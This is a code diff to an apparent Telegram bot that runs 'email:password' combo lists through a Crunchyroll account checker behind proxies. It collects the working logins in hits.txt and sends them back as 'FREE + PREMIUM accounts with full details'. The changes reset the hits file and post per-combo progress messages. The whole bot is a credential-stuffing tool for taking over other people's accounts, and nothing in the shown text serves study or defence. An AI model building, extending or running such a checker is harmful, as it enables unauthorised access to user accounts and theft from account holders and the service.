@@ -264,17 +264,16 @@ async def handle(message: types.Message):
     if not lines:
         return await message.answer("No valid email:password found.")
 
+    # Clear old hits.txt for new check
+    open("hits.txt", "w").close()
+
     checker = CrunchyrollChecker(proxies)
 
-    total = len(lines)
-    progress_msg = await message.answer("Processing 0%")
+    await message.answer(f"🚀 Checking {len(lines)} combos... (delay: {RATE_DELAY}s)")
 
     for i, line in enumerate(lines, 1):
         email, password = line.split(":", 1)
-        
-        # Update same message with new percentage
-        percentage = int((i / total) * 100)
-        await progress_msg.edit_text(f"Processing {percentage}%")
+        await message.answer(f"[{i}/{len(lines)}] Checking → {email}")
 
         result = checker.check(email.strip(), password.strip())
 
@@ -290,7 +289,7 @@ async def handle(message: types.Message):
 
         await asyncio.sleep(RATE_DELAY)
 
-    # Send hits.txt file at the end
+    # Send fresh hits.txt file
     if os.path.exists("hits.txt") and os.path.getsize("hits.txt") > 0:
         await message.answer_document(FSInputFile("hits.txt"), caption="✅ Here are all FREE + PREMIUM accounts with full details")
     else:
